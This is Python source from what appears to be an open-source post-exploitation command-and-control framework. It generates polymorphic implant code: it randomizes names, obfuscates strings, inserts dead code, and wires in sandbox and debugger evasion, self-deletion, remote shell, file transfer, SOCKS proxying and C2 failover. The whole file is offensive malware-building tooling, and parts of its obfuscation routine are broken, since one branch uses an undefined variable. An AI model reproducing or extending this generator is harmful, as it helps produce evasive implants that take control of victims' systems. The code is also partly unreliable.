"""
The Neo C2 Framework is a post-exploitation command and control framework.

This file is part of Neo C2 Framework.
Copyright (C) 2025 @stillbigjosh

The Neo C2 Framework of this edition is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

The Neo C2 Framework is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Neo.  If not, see <http://www.gnu.org/licenses/>
"""

import uuid
import random
import string
import json
import base64
import hashlib
import time
import os
from datetime import datetime
from cryptography.fernet import Fernet

class PolymorphicEngine:
    def __init__(self):
        self.var_mapping = {}
        self.func_mapping = {}

    def generate_random_name(self, prefix='', length=None):
        if length is None:
            length = random.randint(6, 12)

        styles = [
            lambda: ''.join(random.choices(string.ascii_lowercase, k=length)),
            lambda: '_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=length-1)),
            lambda: ''.join(random.choice([c.upper(), c.lower()]) for c in random.choices(string.ascii_letters, k=length)),
        ]

        name = random.choice(styles)()
        return prefix + name if prefix else name

    def generate_go_field_name(self, prefix='', length=None):
        if length is None:
            length = random.randint(6, 12)

        name = ''.join(random.choices(string.ascii_lowercase, k=length))
        capitalized_name = name[0].upper() + name[1:]
        return prefix + capitalized_name if prefix else capitalized_name

    def obfuscate_string(self, s):
        technique = random.randint(0, 4)

        if technique == 0:
            encoded = base64.b64encode(s.encode()).decode()
            return f"__import__('base64').b64decode('{encoded}').decode()"
        elif technique == 1:
            hex_str = s.encode().hex()
            return f"bytes.fromhex('{hex_str}').decode()"
        elif technique == 2:
            codes = [str(ord(c)) for c in s]
            return f"chr({codes[0]}) + chr({codes[1]}) + chr({codes[2:]})" if len(codes) >= 3 else f"chr({','.join(codes)})"
        elif technique == 3:
            reversed_s = s[::-1]
            return f"'{s[:mid]}' + '{s[mid:]}'"
        else:
            mid = len(s) // 2
            return f"'{s[:mid]}' + '{s[mid:]}'"

    def generate_dead_code(self):
        var_name = self.generate_random_name()
        value = random.choice(['None', '0', '""', '[]', '{}', 'False', 'True'])
        comment = random.choice(['Placeholder', 'Reserved', 'Internal', 'Config', 'Cache', 'State'])

        dead_code_templates = [
            f"_{var_name} = {value}  # {comment}",
            f"_{var_name} = lambda: {value}  # {comment}",
            f"# {comment}\n        _{var_name} = {value}",
        ]

        return random.choice(dead_code_templates)


class MorpheusPayloadGenerator:
    def __init__(self, config, db):
        self.config = config
        self.db = db

    def _generate_fernet_key(self):
        return Fernet.generate_key().decode()

    def generate_payload(self, listener_id, obfuscate=False, disable_sandbox=False, use_redirector=False, use_failover=False, kill_date='2025-12-31T23:59:59Z', working_hours=None, redirector_host='0.0.0.0', redirector_port=80, failover_urls=None):
        if failover_urls is None:
            failover_urls = []
        if working_hours is None:
            working_hours = {
                "start_hour": 9,
                "end_hour": 17,
                "timezone": "UTC",
                "days": [1, 2, 3, 4, 5]  # Monday to Friday
            }

        print(f"[DEBUG] Generating POLYMORPHIC Morpheus payload for listener_id: {listener_id}")

        listener = self.db.get_listener(listener_id)
        if not listener:
            listener = self.db.get_listener_by_name(listener_id)
            if not listener:
                raise ValueError(f"Listener with ID or name '{listener_id}' not found.")
        print(f"[DEBUG] Listener profile_name: {listener.get('profile_name', 'default')}")

        profile = self.db.get_profile_by_name(listener['profile_name'])
        if not profile:
            profile = self.db.get_profile_by_name('default')
            if not profile:
                raise ValueError(f"Profile '{listener['profile_name']}' not found and no default profile available.")

        profile_config = profile.get('config', {})

        if isinstance(profile_config, str):
            try:
                profile_config = json.loads(profile_config)
            except json.JSONDecodeError:
                print(f"[WARNING] Profile config is invalid JSON, using empty config")
                profile_config = {}
        elif not isinstance(profile_config, dict):
            print(f"[WARNING] Profile config is not a dict, using empty config")
            profile_config = {}

        # Override with passed parameters
        profile_config['kill_date'] = kill_date
        profile_config['working_hours'] = working_hours
        profile_config['redirector'] = {
            'redirector_host': redirector_host,
            'redirector_port': redirector_port
        }
        profile_config['failover_urls'] = failover_urls

        protocol = profile_config.get('protocol', 'http')
        host = listener['host']
        if host == '0.0.0.0':
            host = self.config.get('server.host', '127.0.0.1')
        port = listener['port']
        c2_server_url = f"{protocol}://{host}:{port}"

        agent_id = str(uuid.uuid4())
        secret_key = self.db._generate_secret_key() if hasattr(self.db, '_generate_secret_key') else self._generate_fernet_key()

        try:
            self.db.execute('''
                INSERT INTO agents (id, ip_address, hostname, os_info, user, listener_id, first_seen, last_seen, status, secret_key)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (agent_id, '0.0.0.0', 'pending', 'pending', 'pending', listener_id, datetime.now(), datetime.now(), 'pending', secret_key))
            print(f"[+] Agent pre-registered in database with ID: {agent_id}")

            max_retries = 5
            for attempt in range(max_retries):
                verification = self.db.fetchone("SELECT secret_key FROM agents WHERE id = ?", (agent_id,))
                if verification and verification['secret_key'] == secret_key:
                    print(f"[+] Verified agent pre-registration for ID: {agent_id}")
                    break
                else:
                    print(f"[DEBUG] Agent not yet visible in database (attempt {attempt + 1}/{max_retries}), retrying...")
                    time.sleep(0.1)
            else:
                print(f"[ERROR] Failed to verify agent pre-registration after {max_retries} attempts")
                raise Exception(f"Agent pre-registration verification failed for ID: {agent_id}")

        except Exception as e:
            print(f"[ERROR] Failed to pre-register agent: {str(e)}")
            raise

        return self._generate_morpheus(
            agent_id, secret_key, c2_server_url, profile_config, obfuscate, disable_sandbox=disable_sandbox, kill_date=kill_date, working_hours=working_hours, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls
        )

    def _generate_morpheus(self, agent_id, secret_key, c2_url, profile_config, obfuscate, disable_sandbox=False, kill_date='2025-12-31T23:59:59Z', working_hours=None, use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None):
        if failover_urls is None:
            failover_urls = []
        if working_hours is None:
            working_hours = {
                "start_hour": 9,
                "end_hour": 17,
                "timezone": "UTC",
                "days": [1, 2, 3, 4, 5]  # Monday to Friday
            }

        poly = PolymorphicEngine()

        endpoints = profile_config.get('endpoints', {})
        register_uri = endpoints.get('register', '/api/users/register')
        tasks_uri = endpoints.get('tasks', '/api/users/{agent_id}/profile')
        results_uri = endpoints.get('results', '/api/users/{agent_id}/activity')
        interactive_uri = endpoints.get('interactive', '/api/users/{agent_id}/settings')
        interactive_status_uri = endpoints.get('interactive_status', '/api/users/{agent_id}/status')

        headers = profile_config.get('headers', {'User-Agent': 'Python C2 Agent'})
        heartbeat = profile_config.get('heartbeat_interval', 60)
        jitter = profile_config.get('jitter', 0.2)

        class_name = poly.generate_random_name('Agent')

        m_init = '__init__'  # Keep __init__ standard
        m_send = poly.generate_random_name('send_')
        m_register = poly.generate_random_name('register_')
        m_get_tasks = poly.generate_random_name('get_tasks_')
        m_exec = poly.generate_random_name('exec_')
        m_submit = poly.generate_random_name('submit_')
        m_run = poly.generate_random_name('run_')
        m_check_interactive_status = poly.generate_random_name('check_interactive_')
        m_get_interactive_command = poly.generate_random_name('get_interactive_cmd_')
        m_submit_interactive_result = poly.generate_random_name('submit_interactive_')
        m_start_interactive_polling = poly.generate_random_name('start_interactive_')
        m_stop_interactive_polling = poly.generate_random_name('stop_interactive_')
        m_interactive_poll_worker = poly.generate_random_name('interactive_worker_')
        m_enter_interactive_mode = poly.generate_random_name('enter_interactive_')
        m_exit_interactive_mode = poly.generate_random_name('exit_interactive_')
        m_stop_agent = poly.generate_random_name('stop_agent_')

        m_check_sandbox = poly.generate_random_name('check_sandbox_')
        m_check_debuggers = poly.generate_random_name('check_debuggers_')
        m_check_network_tools = poly.generate_random_name('check_network_tools_')
        m_self_delete = poly.generate_random_name('self_delete_')

        # Failover method names
        m_try_failover = poly.generate_random_name('try_failover_')
        m_increment_fail_count = poly.generate_random_name('increment_fail_count_')
        m_reset_fail_count = poly.generate_random_name('reset_fail_count_')

        m_handle_upload = poly.generate_random_name('handle_upload_')
        m_handle_download = poly.generate_random_name('handle_download_')

        m_start_direct_shell = poly.generate_random_name('start_direct_shell_')
        m_handle_direct_shell = poly.generate_random_name('handle_direct_shell_')


        m_encrypt_data = poly.generate_random_name('encrypt_data_')
        m_decrypt_data = poly.generate_random_name('decrypt_data_')
        m_check_working_hours = poly.generate_random_name('check_working_hours_')
        m_check_kill_date = poly.generate_random_name('check_kill_date_')

        v_c2 = poly.generate_random_name('c2_')
        v_agent_id = poly.generate_random_name('agent_id_')
        v_headers = poly.generate_random_name('headers_')
        v_heartbeat = poly.generate_random_name('heartbeat_')
        v_jitter = poly.generate_random_name('jitter_')
        v_register_uri = poly.generate_random_name('reg_uri_')
        v_tasks_uri = poly.generate_random_name('tasks_uri_')
        v_results_uri = poly.generate_random_name('results_uri_')
        v_interactive_uri = poly.generate_random_name('interactive_uri_')
        v_interactive_status_uri = poly.generate_random_name('interactive_status_uri_')
        v_running = poly.generate_random_name('running_')
        v_hostname = poly.generate_random_name('hostname_')
        v_username = poly.generate_random_name('username_')
        v_os_info = poly.generate_random_name('os_info_')
        v_interactive_mode = poly.generate_random_name('interactive_mode_')
        v_interactive_thread = poly.generate_random_name('interactive_thread_')
        v_interactive_polling = poly.generate_random_name('interactive_polling_')
        v_current_interactive_task = poly.generate_random_name('current_interactive_task_')

        v_secret_key = poly.generate_random_name('secret_key_')
        v_fernet = poly.generate_random_name('fernet_')


        v_sandbox_enabled = poly.generate_random_name('sandbox_enabled_')

        v_kill_date = poly.generate_random_name('kill_date_')
        v_working_hours = poly.generate_random_name('working_hours_')

        # Redirector variables
        v_redirector_host = poly.generate_random_name('redirector_host_')
        v_redirector_port = poly.generate_random_name('redirector_port_')
        v_use_redirector = poly.generate_random_name('use_redirector_')

        # Failover variables
        v_use_failover = poly.generate_random_name('use_failover_')
        v_failover_urls = poly.generate_random_name('failover_urls_')
        v_current_c2_url = poly.generate_random_name('current_c2_url_')
        v_current_fail_count = poly.generate_random_name('current_fail_count_')
        v_max_fail_count = poly.generate_random_name('max_fail_count_')
        v_in_failover_attempt = poly.generate_random_name('in_failover_attempt_')

        # Reverse proxy variables
        v_reverse_proxy_active = poly.generate_random_name('reverse_proxy_active_')
        v_reverse_proxy_stop_event = poly.generate_random_name('reverse_proxy_stop_event_')
        v_reverse_proxy_thread = poly.generate_random_name('reverse_proxy_thread_')

        # Reverse proxy method names
        m_start_reverse_proxy = poly.generate_random_name('start_reverse_proxy_')
        m_stop_reverse_proxy = poly.generate_random_name('stop_reverse_proxy_')
        m_handle_socks5 = poly.generate_random_name('handle_socks5_')
        m_relay_data = poly.generate_random_name('relay_data_')

        if obfuscate:
            register_uri_code = poly.obfuscate_string(register_uri)
            tasks_uri_code = poly.obfuscate_string(tasks_uri)
            results_uri_code = poly.obfuscate_string(results_uri)
            interactive_uri_code = poly.obfuscate_string(interactive_uri)
            interactive_status_uri_code = poly.obfuscate_string(interactive_status_uri)
        else:
            register_uri_code = f'"{register_uri}"'
            tasks_uri_code = f'"{tasks_uri}"'
            results_uri_code = f'"{results_uri}"'
            interactive_uri_code = f'"{interactive_uri}"'
            interactive_status_uri_code = f'"{interactive_status_uri}"'

        dead_code_1 = poly.generate_dead_code()
        dead_code_2 = poly.generate_dead_code()
        dead_code_3 = poly.generate_dead_code()
        dead_code_4 = poly.generate_dead_code()

        imports = [
            "import sys", "import os", "import time", "import json",
            "import socket", "import platform", "import subprocess",
            "import requests", "import random", "import threading",
            "import base64", "import shutil", "import ctypes", "import uuid",
            "from cryptography.fernet import Fernet"
        ]
        random.shuffle(imports)
        imports_code = '\n'.join(imports)

        listener_id_for_registration = 'web_app_default'


        template_path = os.path.join(os.path.dirname(__file__), 'morpheus_template.py')
        with open(template_path, 'r') as f:
            agent_template = f.read()

        agent_template = agent_template.format(
            imports_code=imports_code,
            dead_code_1=dead_code_1,
            class_name=class_name,
            m_init=m_init,
            m_send=m_send,
            m_register=m_register,
            m_get_tasks=m_get_tasks,
            m_exec=m_exec,
            m_submit=m_submit,
            m_run=m_run,
            m_check_interactive_status=m_check_interactive_status,
            m_get_interactive_command=m_get_interactive_command,
            m_submit_interactive_result=m_submit_interactive_result,
            m_start_interactive_polling=m_start_interactive_polling,
            m_stop_interactive_polling=m_stop_interactive_polling,
            m_interactive_poll_worker=m_interactive_poll_worker,
            m_enter_interactive_mode=m_enter_interactive_mode,
            m_exit_interactive_mode=m_exit_interactive_mode,
            m_stop_agent=m_stop_agent,
            m_check_sandbox=m_check_sandbox,
            m_check_debuggers=m_check_debuggers,
            m_check_network_tools=m_check_network_tools,
            m_self_delete=m_self_delete,
            m_try_failover=m_try_failover,
            m_increment_fail_count=m_increment_fail_count,
            m_reset_fail_count=m_reset_fail_count,
            m_handle_upload=m_handle_upload,
            m_handle_download=m_handle_download,
            m_start_direct_shell=m_start_direct_shell,
            m_handle_direct_shell=m_handle_direct_shell,
            m_encrypt_data=m_encrypt_data,
            m_decrypt_data=m_decrypt_data,
            m_check_working_hours=m_check_working_hours,
            m_check_kill_date=m_check_kill_date,
            v_c2=v_c2,
            v_agent_id=v_agent_id,
            v_headers=v_headers,
            headers=json.dumps(headers),
            v_heartbeat=v_heartbeat,
            v_jitter=v_jitter,
            v_register_uri=v_register_uri,
            v_tasks_uri=v_tasks_uri,
            v_results_uri=v_results_uri,
            v_interactive_uri=v_interactive_uri,
            v_interactive_status_uri=v_interactive_status_uri,
            heartbeat=heartbeat,
            jitter=jitter,
            register_uri_code=register_uri_code,
            tasks_uri_code=tasks_uri_code,
            results_uri_code=results_uri_code,
            interactive_uri_code=interactive_uri_code,
            interactive_status_uri_code=interactive_status_uri_code,
            v_running=v_running,
            v_hostname=v_hostname,
            v_username=v_username,
            v_os_info=v_os_info,
            v_interactive_mode=v_interactive_mode,
            v_interactive_thread=v_interactive_thread,
            v_interactive_polling=v_interactive_polling,
            v_current_interactive_task=v_current_interactive_task,
            v_secret_key=v_secret_key,
            v_fernet=v_fernet,
            v_sandbox_enabled=v_sandbox_enabled,
            v_redirector_host=v_redirector_host,
            v_redirector_port=v_redirector_port,
            v_use_redirector=v_use_redirector,
            v_use_failover=v_use_failover,
            v_failover_urls=v_failover_urls,
            v_current_c2_url=v_current_c2_url,
            v_current_fail_count=v_current_fail_count,
            v_max_fail_count=v_max_fail_count,
            v_in_failover_attempt=v_in_failover_attempt,
            v_kill_date=v_kill_date,
            v_working_hours=v_working_hours,
            kill_date=kill_date,
            working_hours_start_hour=working_hours.get('start_hour', 9),
            working_hours_end_hour=working_hours.get('end_hour', 17),
            working_hours_timezone=working_hours.get('timezone', 'UTC'),
            working_hours_days=working_hours.get('days', [1, 2, 3, 4, 5]),  # Pass as actual list for template formatting
            sandbox_check_enabled=not disable_sandbox,  # Set to False if sandbox is disabled
            dead_code_2=dead_code_2,
            dead_code_3=dead_code_3,
            dead_code_4=dead_code_4,
            c2_url=c2_url,
            agent_id=agent_id,
            listener_id_for_registration=listener_id_for_registration,
            secret_key=secret_key,
            redirector_host=redirector_host,
            redirector_port=redirector_port,
            use_redirector=str(use_redirector).lower().capitalize(),
            use_failover=str(use_failover).lower().capitalize(),
            failover_urls=failover_urls,
            v_reverse_proxy_active=v_reverse_proxy_active,
            v_reverse_proxy_stop_event=v_reverse_proxy_stop_event,
            v_reverse_proxy_thread=v_reverse_proxy_thread,
            m_start_reverse_proxy=m_start_reverse_proxy,
            m_stop_reverse_proxy=m_stop_reverse_proxy,
            m_handle_socks5=m_handle_socks5,
            m_relay_data=m_relay_data
        )

        print(f"[+] POLYMORPHIC Morpheus agent generated (Class: {class_name})")
        return agent_template.strip()
